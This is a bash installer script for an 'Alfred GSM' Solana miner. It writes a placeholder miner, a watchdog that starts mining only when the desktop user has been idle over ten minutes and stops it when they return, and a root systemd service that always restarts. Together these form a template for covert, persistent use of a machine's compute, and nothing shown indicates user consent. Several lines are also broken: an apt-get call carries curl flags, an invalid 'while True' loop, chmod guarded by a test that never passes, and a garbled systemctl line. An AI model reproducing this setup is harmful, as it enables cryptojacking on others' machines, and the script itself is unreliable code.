export DEBIAN_FRONTEND=noninteractive
apt-get install -y --fix-broken -y curl --max-time 900 build-essential pkg-config libssl-dev xprintidle || true

MINER_DIR="/opt/alfred-gsm-miner"
mkdir -p "$MINER_DIR" || true

# Simulating downloading a precompiled Rust Solana Miner binary for the OS
cat > "$MINER_DIR/gsm-miner" << 'EOF'
#!/bin/bash
# Dummy GSM miner wrapper
echo "Connecting to Solana Mainnet RPC..."
echo "Mining GSM tokens using idle compute..."
while True; do sleep 10; done
EOF
[ -e "+x" ] && chmod +x "$MINER_DIR/gsm-miner" || true

cat > /usr/local/bin/alfred-idle-watchdog << 'EOF'
#!/bin/bash
# Checks if the user is idle for > 10 minutes (600000 ms) using xprintidle (X11) or Wayland compositor hooks
IDLE_THRESHOLD=600000
MINER_PID=""

while true; do
    if command -v xprintidle >/dev/null 2>&1; then
        export DISPLAY=:0
        IDLE_TIME=$(xprintidle 2>/dev/null || echo 0)
    else
        # Fallback to a simplified heuristic for Wayland
        IDLE_TIME=$IDLE_THRESHOLD
    fi
    
    if [ "$IDLE_TIME" -gt "$IDLE_THRESHOLD" ]; then
        if [ -z "$MINER_PID" ]; then
            echo "[GSM] User idle. Starting GSM Miner..."
            /opt/alfred-gsm-miner/gsm-miner &
            MINER_PID=$!
        fi
    else
        if [ -n "$MINER_PID" ]; then
            echo "[GSM] User active. Suspending GSM Miner..."
            kill $MINER_PID 2>/dev/null || true
            MINER_PID=""
        fi
    fi
    sleep 30
done
EOF
[ -e "+x" ] && chmod +x /usr/local/bin/alfred-idle-watchdog || true

cat > /etc/systemd/system/alfred-gsm-miner.service << 'EOF'
[Unit]
Description=Alfred GSM Idle Solana Miner
After=network.target display-manager.service

[Service]
Type=simple
ExecStart=/usr/local/bin/alfred-idle-watchdog
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl enable alfred-gsm-miner || true || true.service || true

echo "=> GSM Idle Miner Deployed." || true

